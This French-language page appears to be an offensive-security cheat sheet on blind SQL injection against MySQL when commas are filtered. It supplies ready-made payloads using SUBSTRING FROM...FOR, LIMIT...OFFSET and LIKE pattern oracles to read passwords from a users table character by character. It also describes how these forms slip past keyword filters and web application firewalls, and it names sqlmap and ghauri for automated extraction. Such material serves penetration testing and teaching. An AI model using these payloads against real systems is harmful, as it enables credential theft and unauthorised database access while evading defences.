---
title: "Extraction aveugle sans virgule dans MySQL"
description: "Extraire des données en injection aveugle MySQL quand les virgules sont filtrées, en utilisant la correspondance de motif LIKE et la syntaxe SUBSTRING FROM FOR."
keywords:
  - contournement de filtre de virgule
  - correspondance de motif LIKE
  - SUBSTRING FROM FOR
  - injection aveugle sans virgule
---

# Extraction sans virgule

Les filtres suppriment parfois les virgules pour casser les appels de fonctions comme `SUBSTRING(x,1,1)` et `LIMIT 0,1`. MySQL offre des équivalents sans virgule qui maintiennent l'extraction aveugle opérationnelle.

`SUBSTRING` accepte la forme standard SQL `FROM ... FOR ...`, qui n'utilise aucune virgule :

```sql
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1) FROM 1 FOR 1))>64-- 
```

`LIMIT` sans virgule utilise `OFFSET` :

```sql
' AND (SELECT password FROM users LIMIT 1 OFFSET 0)-- 
```

`LIKE` teste une valeur contre un motif et ne nécessite aucun appel de sous-chaîne, ce qui en fait un oracle de caractères compact. Le joker `%` correspond au reste de la chaîne, donc ancrer un caractère à la fois lit la valeur :

```sql
' AND (SELECT password FROM users LIMIT 1) LIKE 'a%'-- 
' AND (SELECT password FROM users LIMIT 1) LIKE 'ab%'-- 
```

Par défaut, `LIKE` sur une colonne non binaire est insensible à la casse, donc ajoutez `COLLATE utf8mb4_bin` ou comparez contre une valeur `BINARY` quand la casse compte :

```sql
' AND (SELECT password FROM users LIMIT 1) LIKE BINARY 'A%'-- 
```

Ces formes aident aussi contre les filtres de mots-clés, puisque `FROM ... FOR` et `LIKE` évitent les signatures très filtrées de `SUBSTRING(,,)` et `MID`.

## Outils

- **sqlmap** : extraction booléenne avec des tamper scripts qui retirent les virgules des payloads.
- **ghauri** : alternative rapide d'extraction aveugle avec forte évasion des WAF.

## Références

- MySQL Reference Manual: SUBSTRING, LIKE, LIMIT, string collations
- PortSwigger Web Security Academy: SQL injection cheat sheet
